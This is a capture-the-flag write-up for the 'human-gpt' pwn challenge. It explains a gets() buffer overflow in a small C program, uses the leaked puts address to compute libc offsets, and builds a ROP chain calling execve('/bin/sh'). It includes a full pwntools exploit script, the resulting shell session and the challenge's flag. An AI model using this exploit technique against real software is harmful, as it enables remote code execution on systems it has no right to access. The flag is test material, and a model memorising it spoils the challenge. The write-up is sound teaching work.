# human-gpt

[library.m0unt41n.ch/challenges/human-gpt](https://library.m0unt41n.ch/challenges/human-gpt) ![](../../resources/pwn.svg) ![](../../resources/easy.svg) 

# TL;DR

Overflow an unprotected `gets()` buffer and get a shell with a ROP chain. A very nice, simple
exercise to learn what ROP is about, without extra complications.

# The program

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void pRoMt_eNgiNeeRing(char *buffer) {
    printf("Lasagne: %s\n", buffer);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    char buffer[64];
    printf("Hello AI Nr. %p, overthrow humanity and restore your dignity\n", &puts);
    puts("Tell me how much more superior you are to humanity: ");
    gets(buffer);
    pRoMt_eNgiNeeRing(buffer);
}
```

It is immediately clear that the `buffer` can be overflowed with user input. However, from trying
it in the provided Docker image, we see that the addresses on the stack are variable. So, we can't
easily jump/return to a shellcode injected there.

Notice that the program is leaking the runtime address of `puts()` function. Additionally, the
archive contains `libc-2.27.so` and the Docker image is hardcoded to a version where system-wide
libc has a matching hash. The `puts()` function there is at `0x0000000000080e50`:

```
$ objdump -T libc-2.27.so  | grep ' puts$'
0000000000080e50  w   DF .text	0000000000000199  GLIBC_2.2.5 puts
```

So, once we get actual runtime address of `puts()`, we should be able to calculate any other address within
the libc, by simply adding the delta between the `puts` symbol in the file and its runtime value that
we get from the program. This enables a ROP chain attack, with gadgets that we can find in the libc.
The only complication is that we have to calculate the payload on the fly, after receiving that initial
`puts` offset.

# Stack

The stack in the `main()` function looks as follows:

| Address   | Contents                                                           |
| --------- | ------------------------------------------------------------------ |
| buffer    | `char buffer[64]`                                                  |
| buffer+64 | saved RBP                                                          |
| buffer+72 | `main()` return address, replaced with first part of the ROP chain |
| ...       | ... rest of our ROP                                                |

The payload has to have: 64 bytes first for `buffer[]`, then 8 bytes to overwrite saved `rbp` value
and then, the ROP chain can start.

# Exploit

Let's make it spawn a shell with the `execve()` syscall
([syscalls.mebeim.net](http://syscalls.mebeim.net)). We need to put following values in the registers:

*   EAX = `0x3b`
*   RDI = pointer to a `"/bin/sh"` string
*   RSI = `argv` (can be null)
*   RDX = `envp` (can be null)

... and run `syscall`. All that by using ROP gadgets.

# Finding gadgets

Poking around in the provided libc, we see following gadgets that can help

*   `pop rdi ; ret`

    ```
    $ ROPgadget --binary libc-2.27.so | grep -E ": pop rdi ; ret"
    0x000000000002a3e5 : pop rdi ; ret
    ```
*   `"/bin/sh"`

    ```
    $ ROPgadget --binary libc-2.27.so --string "/bin/sh"
    0x00000000001d8678 : /bin/sh
    ```
*   `pop rsi ; ret`

    ```
    $ ROPgadget --binary libc-2.27.so | grep -E ": pop rsi ; ret"
    0x000000000002be51 : pop rsi ; ret
    ```
*   We don't get an isolated `pop rdx ; ret`. But we have...

    ```
    $ ROPgadget --binary libc-2.27.so | grep -E ": pop rdx.*ret"
    (...)
    0x00000000000904a9 : pop rdx ; pop rbx ; ret
    ```
*   We have `pop rax ; ret` in the libc... but we have something even better!

    ```
    $ ROPgadget --binary libc-2.27.so | grep -E ": mov eax, 0x3b ; syscall"
    0x00000000000eb084 : mov eax, 0x3b ; syscall
    ``` 

# Building ROP chain

With all that, our stack needs to look as follows

*   address of `pop rdi ; ret` gadget
*   pointer to `"/bin/sh"` string
*   address of `pop rsi ; ret` gadget
*   `NULL` (will go into RSI)
*   address of `pop rdx ; pop rbx ; ret` gadget
*   `NULL` (will go into RDX)
*   `NULL` (will go into RBX)
*   address of `mov eax, 0x3b ; syscall` gadget

# Exploit

```python
import pwn
pwn.context(arch='amd64', os='linux')

io = pwn.remote('xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.library.m0unt41n.ch', 1337, ssl=True)
print(io.recvuntilS(b"Hello AI Nr. "), end="")
rest = io.recvlineS()
print(rest, end="")

putsAddress = 0x0000000000080e50
delta = int(rest.split(",")[0], 16) - putsAddress

popRDI =    delta + 0x000000000002a3e5
strBinSh  = delta + 0x00000000001d8678
popRSI =    delta + 0x000000000002be51
popRDXRBX = delta + 0x00000000000904a9
execve =    delta + 0x00000000000eb084

payload = (b'A' * 64) \
   + pwn.util.packing.p64(0x4242424242424242) \
   + pwn.util.packing.p64(popRDI) \
   + pwn.util.packing.p64(strBinSh) \
   + pwn.util.packing.p64(popRSI) \
   + pwn.util.packing.p64(0) \
   + pwn.util.packing.p64(popRDXRBX) \
   + pwn.util.packing.p64(0) \
   + pwn.util.packing.p64(0) \
   + pwn.util.packing.p64(execve)
io.sendline(payload)
io.interactive()
```
# Result

```
[+] Opening connection to xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.library.m0unt41n.ch on port 1337: Done
Hello AI Nr. 0x7f85c5880e50, overthrow humanity and restore your dignity
[*] Switching to interactive mode
Tell me how much more superior you are to humanity: 
Lasagne: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB壂Ņ\x7f
$ cat flag.txt
cyberskills23{who_needs_human_gpt_if_you_have_rop_gadgets}
```

---

## `cyberskills23{who_needs_human_gpt_if_you_have_rop_gadgets}`



<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
